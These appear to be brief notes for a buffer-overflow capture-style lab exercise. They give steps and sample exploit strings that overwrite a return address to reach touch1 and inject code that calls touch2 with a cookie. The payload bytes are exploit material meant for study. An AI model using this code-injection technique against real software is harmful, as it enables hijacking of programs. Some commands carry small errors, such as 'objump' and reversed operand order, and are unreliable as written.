Phase 0
=======

Determine address of touch1()

Determine size allocated for stack

Convert address using hex2raw

Insert address in buffer (pad rest with 00's)

Sample buffer:

  00 00 00 00 00 00 00 00

  00 00 00 00 00 00 00 00

  00 00 00 00 00 00 00 00

  55 19 40 00 00 00 00 00  /* address of touch1 */

Phase 1
=======

Similar to previous phase, but call a function with an argument

Will call touch2(cookie)

Make a .s file with movl cookie, $edi 

Generate .o file with gcc

	gcc -c file.s

Obtain hex for instruction

	objump -d file.o

Insert instruction 

Sample buffer:

  bf 9a d9 e2 68 c3 00 00  /* instruction: 
				movl cookie, edi
				retq */

  00 00 00 00 00 00 00 00

  00 00 00 00 00 00 00 00

  38 81 67 55 00 00 00 00  /* address of movl cookie, edi */

  81 19 40 00 00 00 00 00  /* address of touch2 */
